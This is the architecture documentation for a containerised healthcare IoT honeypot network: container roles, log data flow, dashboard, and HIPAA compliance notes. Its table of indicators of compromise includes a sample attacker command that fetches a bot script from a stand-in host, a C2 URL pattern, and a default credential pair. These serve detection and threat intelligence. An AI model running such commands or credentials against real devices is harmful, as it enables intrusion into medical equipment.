# Architecture Documentation
# Healthcare IoT Deception Honeypot Network

## Design Principles

### 1. Deception Without Risk
The entire honeypot stack runs inside Docker containers on an **isolated bridge network** (`172.20.0.0/24`). Attackers who "break in" to the fake shell are interacting with Cowrie's emulated filesystem — they never touch the host OS or real data.

### 2. Defense in Depth (Containment Layers)
```
Layer 1: Docker network isolation  (172.20.0.0/24 subnet)
Layer 2: Container capability drops (cap_drop: ALL)
Layer 3: Read-only mounts where possible
Layer 4: Non-root users inside containers
Layer 5: No outbound internet from honeypot containers
```

### 3. Observe, Don't Block
The system's goal is intelligence gathering, not prevention. We let attackers interact freely inside the sandbox so we can study their TTPs (Tactics, Techniques, Procedures).

---

## Container Roles

### cowrie (172.20.0.10)
- **Ports exposed:** 2222 (SSH), 2223 (Telnet)
- **Purpose:** Emulates an SSH/Telnet server running on a Philips IntelliVue medical device gateway
- **What it captures:** Every keystroke, every command, every uploaded file (malware), timing of all interactions
- **Key config:** `cowrie.cfg` sets the fake hostname, banner, and filesystem; `userdb.txt` defines which credentials "work"
- **Log format:** JSON Lines at `var/log/cowrie/cowrie.json`

### fake_panel (172.20.0.11)
- **Port exposed:** 8080 → 80 internally
- **Purpose:** Simulates an unauthenticated IoT device web admin panel
- **What it captures:** All HTTP requests (path, method, headers, POST body), login attempts, config change attempts
- **Design:** The login always "succeeds" — attackers see a realistic dashboard, encouraging them to explore longer and reveal more TTPs

### elasticsearch (172.20.0.30)
- **Port exposed:** 9200 (internal only — never expose to internet)
- **Purpose:** Central log store for Filebeat-shipped events
- **Index pattern:** `honeypot-logs-YYYY.MM.DD` (daily rolling)

### filebeat (172.20.0.20)
- **Purpose:** Tail both cowrie.json and panel.log, parse JSON, ship to Elasticsearch
- **Config:** `filebeat/filebeat.yml`

### log_parser (172.20.0.50)
- **Purpose:** Continuously polls cowrie.json, enriches each event with GeoIP data via ip-api.com, stores results in SQLite for fast dashboard queries, also indexes enriched events back to Elasticsearch
- **GeoIP cache:** 24-hour TTL per IP to avoid rate limiting

### dashboard (172.20.0.40)
- **Port exposed:** 5000
- **Purpose:** Flask API serving the threat intelligence dashboard
- **Data source:** SQLite database written by log_parser
- **Refresh:** Dashboard auto-refreshes all panels every 15 seconds via JavaScript fetch()

### nginx (172.20.0.60)
- **Port exposed:** 80
- **Purpose:** Single reverse proxy entry point for analysts; routes `/` to dashboard, `/iot-panel/` to fake_panel

---

## Data Flow

```
Attacker SSH/Telnet
       │
       ▼
  [Cowrie]──────────────────────────────────────────────────────────┐
  Logs every session                                                  │
  to cowrie.json (JSON Lines)                                         │
       │                                                              │
       ├──[Filebeat]──▶ [Elasticsearch]                              │
       │                  honeypot-logs-*                             │
       │                                                              │
       └──[log_parser]                                                │
            │  reads cowrie.json                                       │
            │  calls ip-api.com for GeoIP                             │
            │  writes enriched rows to SQLite                         │
            │  also indexes to ES                                      │
            ▼                                                          │
         [SQLite]                                                      │
            │                                                          │
            ▼                                                          │
       [Dashboard Flask API]                                           │
            │  /api/stats                                              │
            │  /api/recent_events                                      │
            │  /api/map_data          ◀── Analyst opens browser ───────┘
            │  /api/top_ips
            │  /api/country_stats
            │  /api/timeline
            │  /api/malware_hashes
            ▼
       [Browser UI]
         Leaflet world map
         Chart.js timeline
         Live event feed
         Top IPs / credentials / commands
```

---

## IoC Categories Extracted

| IoC Type | Source | Example |
|----------|--------|---------|
| Attacker IP | All events | `185.220.101.45` |
| Geolocation | GeoIP enrichment | `RU, Moscow, Rostelecom` |
| Credential pairs | AUTH_FAIL events | `root / raspberry` |
| Shell commands | COMMAND events | `wget http://evil.com/bot.sh` |
| Malware SHA256 | FILE_DROP events | `d41d8cd98f00...` |
| C2 URLs | Command parsing | `http://185.x.x.x/payload` |
| Session duration | CONNECT + DISCONNECT | 47 seconds |

---

## HIPAA Compliance Notes

This honeypot network contributes to HIPAA Security Rule compliance (45 CFR § 164.312) in the following ways:

- **§ 164.312(a)(1) Access Control** — The honeypot demonstrates that unauthorized access attempts are being actively detected and logged, supporting access control audit requirements.
- **§ 164.312(b) Audit Controls** — Comprehensive logging of all interaction with simulated ePHI systems satisfies audit control requirements.
- **§ 164.312(e)(1) Transmission Security** — Attack data is used to inform network segmentation policy for real medical device networks.
- **Proactive threat intelligence** — HIPAA requires covered entities to regularly evaluate their security posture. Running a honeypot and analyzing attack patterns directly satisfies this ongoing evaluation requirement.
